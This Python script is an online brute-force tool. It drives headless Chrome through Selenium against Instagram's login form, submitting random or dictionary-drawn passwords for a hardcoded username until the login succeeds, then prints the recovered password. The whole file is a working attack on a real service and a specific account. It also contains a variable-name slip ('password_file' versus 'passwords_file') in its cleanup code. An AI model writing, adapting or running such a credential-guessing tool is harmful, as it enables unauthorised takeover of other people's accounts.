from string import printable, digits, ascii_letters, ascii_lowercase, punctuation
from sys import argv
from time import sleep, time
from random import choice, seed
from winsound import Beep
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import *
from pyfiglet import figlet_format


def get_charset(charset):
   match charset:
      case "printable":
         charset = printable
      case "digits":
         charset = digits
      case "lowercase":
         charset = ascii_lowercase
      case "letters":
         charset = ascii_letters
      case "symbols":
         charset = punctuation
   return charset


def passwords_faker(charset=printable, password_len=8):
   return str('').join(choice(charset) for _ in range(password_len))


def main():
   print(f"\n \n{figlet_format('Brute force')}")
   if len(argv) <= 1:
      argv.append(printable)
   charset = get_charset(argv[1])
   password_len = int(8)
   email = str("_matte.02_")  # or USERNAME
   url = str("https://www.instagram.com/")
   password = str("")
   attempts = int(0)
   chrome_options = Options()
   chrome_options.add_argument("--headless")
   chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
   driver = None
   passwords_file = open("./password_dictionary/digits.txt", "r") if argv[1] == "digits" else None
   start_time = time()
   seed(start_time)
   while True:
      try:
         sleep(0.4)
         driver = webdriver.Chrome(executable_path="chromedriver", options=chrome_options)
         driver.get(url)
      except WebDriverException:
         print(f"\nConnection refused with {url}")
         exit(0)
      except KeyboardInterrupt:
         print("\nProgram terminated.")
         exit(0)
      password = passwords_file.readline().strip() if argv[1] == "digits" else passwords_faker(charset, password_len)
      attempts += 1
      print(f"\nAttempt number {attempts}: {(email, password)}")
      try:
         sleep(1.3)
         driver.find_element("name", "username").send_keys(email)
         sleep(0.4)
         driver.find_element("name", "password").send_keys(password)
         sleep(0.4)
         driver.find_element("id", "loginForm").submit()
         sleep(1.4)
         if driver.current_url != url:
            url = driver.current_url
            break
         else:
            driver.close()
      except NoSuchElementException:
         print(f"\nAn element was not found.")
         exit(0)
      except KeyboardInterrupt:
         print("\nProgram terminated.")
         exit(0)
   time_to_guess = round(time() - start_time, 4)
   print(f"\n \nGuessed password in {time_to_guess} with {attempts} attempts (media = {time_to_guess / attempts} sec for attempts): {password} (URL = {url})")
   if passwords_file is not None:
      password_file.close()
   Beep(2000, 1000)


if __name__ == "__main__":
   main()
